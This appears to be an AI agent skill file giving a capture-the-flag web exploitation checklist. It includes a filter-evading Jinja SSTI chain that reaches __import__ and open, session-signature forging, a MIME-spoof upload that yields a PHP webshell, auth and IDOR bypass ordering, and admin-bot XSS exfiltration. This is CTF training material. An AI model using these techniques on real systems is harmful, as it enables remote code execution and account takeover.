---
name: ctf-web
description: "CTF web checklist — Jinja/Twig SSTI behind a character and word blacklist, pickle/RCUBE-style session blob analysis, session/signature forge attempts and their negative table, route enumeration on a CMS-like app, MIME-spoof upload bypass, IDOR/auth-bypass classes. Trigger: web ctf, ssti, jinja blacklist, waf bypass ssti, pickle, session forge, deserialization, upload bypass, mime spoof, route enumeration, cms route."
---

# CTF web — checklist

CTV solved 24/26 web. The wins were **payload construction**, the losses were
**ambiguous session state** (`catatan`, `suratkilat`). This pack encodes both.

## 1. Orientation (before any payload)

```bash
python3 <ctf>/scripts/api-client.py detail <slug>      # full description, not the truncated list
curl -s -D- "$TARGET/" -o /dev/null                     # server, framework, cookies
curl -s "$TARGET/robots.txt"
```

Map every live route and its `Allow` header — `OPTIONS` gives you the method table
for free. In CTV, `OPTIONS /draft/save` revealed `OPTIONS, POST` and saved an hour.

## 2. SSTI behind a blacklist (the big win)

Blacklist seen: chars `._[]+~` and words
`application os popen read txt globals getitem builtins import`.

**Principle: build every banned literal at runtime so the raw body contains none of
them.** A single payload then solves every variant of the challenge.

```bash
python3 <ctf>/scripts/ssti-payload.py --url http://host:PORT/ --field name \
    --expr "<chain>" --audit
```

Chain shape that worked:

```
()|attr(__class__)|attr(__base__)|attr(__subclasses)()
  |selectattr(__name__,equalto,catch_warnings)|first
  |attr(__init__)|attr(__globals__)|attr(get)(__builtins__)
  -> |attr(get)(open) / |attr(get)(__import__)
```

Key details:
- Banned chars are emitted as `%c` with `|format(ord)`; banned words as `%s` with
  single-char args — `read` becomes `"%s%s%s%s"|format("r","e","a","d")`.
- `|attr` has **no** `__getitem__` fallback — for a dict use `obj|attr("get")(key)`.
- `__globals__` is a **dict**, so `os` needs `get("os")`, not attribute access.
- **Always audit** the final payload for leaked chars/words before sending. The
  script's `audit()` fails loudly.
- Re-use the same payload across sibling ports — CTV's identical payload cleared
  4012, 4014, 4015, 4016.

## 3. Session / serialized blob (the loss that taught the most)

When the app **emits** a blob (`RCUBE` + pickle proto4 + b64), the question is
*where is it read back*. Produce a **negative table** before declaring a dead end:

| placement | result |
|---|---|
| query `state`/`draft`/`data`/`blob`/`token` | 200 baseline |
| cookie `state`/`draft`/`rcube`/`sk` | 200 baseline |
| header `X-Draft-State`/`X-State`/`X-RCUBE` | 200 baseline |
| `POST` to the restore route | 405 (method not allowed) |
| `GET route/<b64>` | 404 |

Then: forge the **signature**, not the blob. Identify the framework (Flask +
`itsdangerous`) and try secret × salt × signer combinations, unsigned payloads, and
`Host`/`X-Forwarded-*` overrides. In CTV every variant was negative — but the table
is what made that a *conclusion* rather than a guess.

Check **deserialization sinks**: pickle/marshal/json on every ingest. A route that
saves a form as pickle but never loads a client blob is not a sink.

## 4. Upload bypass

Validation often trusts the **client-supplied MIME type**. Spoof it:
`Content-Type: image/gif` on a `.php`/`.phtml`/`.phar`, and test extension
allow/deny independently of MIME. CTV got a webshell as `www-data` this way.

## 5. Auth / IDOR classes

Order: default creds → client-side role cookie (`role=admin`) → session-upload-progress
trick → forced-password-to-injection (`securebank`: the "strong password" **forced**
SQLi) → JWT confusion → SQLite/injectable username.

Note: `mail/5` with no cookie returned the same body — **authorization was not
enforced**. Always test an object with no credential before crafting a bypass.

## 6. XSS / bot-admin (the `catatan` class)

"Report to admin" = the admin bot opens your URL. Classic needs: a sink, a
same-origin exfil path, and a CSP blocker solved by a permitted gadget. Write the
bot's constraints down before building the payload.

## Output contract

```
CLASS:    ssti | deser | upload | auth | xss | idor
PAYLOAD:  <exact request>
EVIDENCE: <status + snippet>
FLAG:     <flag>
```
